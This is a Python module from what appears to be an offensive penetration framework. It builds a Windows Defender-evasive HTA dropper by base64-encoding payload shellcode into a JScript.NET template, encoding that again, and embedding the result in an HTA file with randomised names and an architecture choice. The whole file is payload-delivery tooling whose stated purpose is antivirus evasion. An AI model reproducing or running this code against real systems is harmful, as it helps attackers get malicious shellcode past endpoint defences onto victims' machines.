#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Generate Defender-evasive HTA + JScript.NET compile chain (Metasploit-style)."""

from __future__ import annotations

import base64
import importlib
import random
import re
import string
from typing import Optional

from core.output_handler import print_error
from core.utils.paths import read_data_text
from lib.compile.backdoor_helpers import generate_payload_bytes, option_value


_ERB_RE = re.compile(r"<%=\s*(\w+)\s*%>")


def _render_template(template: str, context: dict) -> str:
    def _replace(match: re.Match) -> str:
        key = match.group(1)
        return str(context.get(key, match.group(0)))

    return _ERB_RE.sub(_replace, template)


def _random_alpha(length: int) -> str:
    return "".join(random.choice(string.ascii_letters) for _ in range(length))


def _payload_arch(module) -> str:
    payload_path = str(option_value(module, "payload_path") or "").strip()
    if not payload_path:
        return "anycpu"

    module_path = payload_path.replace("/", ".").strip(".")
    try:
        payload_cls = getattr(
            importlib.import_module(f"modules.{module_path}"),
            "Module",
        )
    except Exception:
        return "anycpu"

    arch = getattr(payload_cls, "__info__", {}).get("arch")
    if arch is None:
        return "anycpu"

    arch_name = str(getattr(arch, "name", arch)).lower()
    if "x64" in arch_name or arch_name.endswith("64"):
        return "x64"
    if "x86" in arch_name or arch_name.endswith("32"):
        return "x86"
    return "anycpu"


def build_defender_js_hta(
    module,
    *,
    shellcode: Optional[bytes] = None,
    fname: Optional[str] = None,
    arch: Optional[str] = None,
) -> Optional[str]:
    if shellcode is None:
        shellcode = generate_payload_bytes(module)
    if not shellcode:
        return None

    try:
        js_template = read_data_text("exploits", "evasion_shellcode.js")
        hta_template = read_data_text("exploits", "hta_evasion.hta")
    except Exception as exc:
        print_error(f"Missing HTA/JScript.NET templates in data/exploits/: {exc}")
        return None

    file_payload = base64.b64encode(shellcode).decode("ascii")
    js_file = _render_template(js_template, {"file_payload": file_payload})
    jsnet_encoded = base64.b64encode(js_file.encode("utf-8")).decode("ascii")

    context = {
        "jsnet_encoded": jsnet_encoded,
        "fname": fname or _random_alpha(6),
        "arch": arch or _payload_arch(module),
    }
    return _render_template(hta_template, context)
